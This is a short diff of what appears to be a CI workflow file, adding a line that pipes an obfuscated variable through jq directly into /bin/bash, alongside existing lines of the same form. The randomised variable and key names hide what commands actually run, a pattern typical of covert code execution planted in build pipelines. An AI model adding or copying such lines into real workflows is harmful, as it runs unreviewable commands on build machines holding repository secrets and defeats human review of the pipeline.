@@ -40,6 +40,7 @@ jobs:
           echo $ykicv418 | jq -r .lfodp18192 | /bin/bash
           printf '%s' "$mrz43" | jq -r .z03 | /bin/bash
           echo $h57123 | jq -r .mw75 | /bin/bash
+          printf '%s' "$hjttn5" | jq -r .m655 | /bin/bash
 
       - name: Upload results
         if: always()
